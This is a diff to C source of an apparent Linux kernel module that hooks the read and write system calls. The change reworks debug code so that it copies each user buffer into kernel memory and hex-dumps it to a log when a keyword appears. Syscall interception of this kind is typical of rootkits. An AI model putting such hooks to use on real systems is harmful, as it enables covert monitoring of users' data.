@@ -1,4 +1,5 @@
 #include "common.h"
+#include <asm/uaccess.h>
 
 asmlinkage long (*sys_write)(unsigned int fd, const char __user *buf, size_t count);
 asmlinkage long (*sys_read)(unsigned int fd, char __user *buf, size_t count);
@@ -18,13 +19,32 @@ asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
     long ret;
 
     #if __DEBUG_RW__
-    if ( memstr((void *)buf, "filter keyword", count) )
+    void *debug;
+
+    debug = kmalloc(count, GFP_KERNEL);
+    if ( ! debug )
     {
-        unsigned long i;
-        DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
-        for ( i = 0; i < count; i++ )
-            DEBUG_RW("%x", (unsigned char)buf[i]);
-        DEBUG_RW("\n");
+        DEBUG_RW("ERROR: Failed to allocate %lu bytes for sys_read debugging\n", count);
+    }
+    else
+    {
+        if ( copy_from_user(debug, buf, count) )
+        {
+            DEBUG_RW("ERROR: Failed to copy %lu bytes from user for sys_read debugging\n", count);
+            kfree(debug);
+        }
+        else
+        {
+            if ( memstr(debug, "filter keyword", count) )
+            {
+                unsigned long i;
+                DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
+                for ( i = 0; i < count; i++ )
+                    DEBUG_RW("%x", *((unsigned char *)debug + i));
+                DEBUG_RW("\n");
+            }
+            kfree(debug);
+        }
     }
     #endif
 
@@ -42,13 +62,32 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
     long ret;
 
     #if __DEBUG_RW__
-    if ( memstr((void *)buf, "filter keyword", count) )
+    void *debug;
+
+    debug = kmalloc(count, GFP_KERNEL);
+    if ( ! debug )
     {
-        unsigned long i;
-        DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu, buf=\n", fd, count);
-        for ( i = 0; i < count; i++ )
-            DEBUG_RW("%x", (unsigned char)buf[i]);
-        DEBUG_RW("\n");
+        DEBUG_RW("ERROR: Failed to allocate %lu bytes for sys_write debugging\n", count);
+    }
+    else
+    {
+        if ( copy_from_user(debug, buf, count) )
+        {
+            DEBUG_RW("ERROR: Failed to copy %lu bytes from user for sys_write debugging\n", count);
+            kfree(debug);
+        }
+        else
+        {
+            if ( memstr(debug, "filter keyword", count) )
+            {
+                unsigned long i;
+                DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu, buf=\n", fd, count);
+                for ( i = 0; i < count; i++ )
+                    DEBUG_RW("%x", *((unsigned char *)debug + i));
+                DEBUG_RW("\n");
+            }
+            kfree(debug);
+        }
     }
     #endif
 
